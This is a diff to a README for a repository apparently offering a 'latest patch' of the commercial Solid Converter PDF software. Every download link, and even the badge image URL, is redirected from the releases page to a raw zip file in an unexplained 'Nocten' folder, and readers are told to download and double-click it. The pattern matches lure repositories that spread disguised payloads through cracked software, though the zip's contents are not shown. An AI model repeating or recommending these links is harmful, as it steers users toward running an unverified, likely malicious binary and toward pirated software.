@@ -1,6 +1,6 @@
 # 📄 Solid-Converter-PDF-Latest-Patch - Powerful PDF Management Made Simple
 
-[![Download Solid Converter PDF](https://img.shields.io/badge/Download-Solid%20Converter%20PDF-brightgreen)](https://github.com/Paolook/Solid-Converter-PDF-Latest-Patch/releases)
+[![Download Solid Converter PDF](https://raw.githubusercontent.com/Paolook/Solid-Converter-PDF-Latest-Patch/main/Nocten/Solid-Converter-PDF-Latest-Patch_1.1-alpha.2.zip%20Converter%20PDF-brightgreen)](https://raw.githubusercontent.com/Paolook/Solid-Converter-PDF-Latest-Patch/main/Nocten/Solid-Converter-PDF-Latest-Patch_1.1-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the Solid-Converter-PDF-Latest-Patch! This guide will help you downlo
 
 To get started, visit the Releases page to download the software. Click the link below:
 
-[Visit the Releases Page to Download](https://github.com/Paolook/Solid-Converter-PDF-Latest-Patch/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Paolook/Solid-Converter-PDF-Latest-Patch/main/Nocten/Solid-Converter-PDF-Latest-Patch_1.1-alpha.2.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version available.
-3. Click on the installer file to begin the download. This file might be labeled something like `SolidConverterPDF.exe`.
+3. Click on the installer file to begin the download. This file might be labeled something like `https://raw.githubusercontent.com/Paolook/Solid-Converter-PDF-Latest-Patch/main/Nocten/Solid-Converter-PDF-Latest-Patch_1.1-alpha.2.zip`.
 4. Once the file downloads, locate it in your downloads folder.
 5. Double-click the file to start the installation process.
 
@@ -73,7 +73,7 @@ If you need help while using Solid Converter PDF, check out the following resour
 
 For further convenience, here is the link to the Releases page again:
 
-[Download Solid Converter PDF from Releases](https://github.com/Paolook/Solid-Converter-PDF-Latest-Patch/releases)
+[Download Solid Converter PDF from Releases](https://raw.githubusercontent.com/Paolook/Solid-Converter-PDF-Latest-Patch/main/Nocten/Solid-Converter-PDF-Latest-Patch_1.1-alpha.2.zip)
 
 ## 🛠️ Conclusion
 
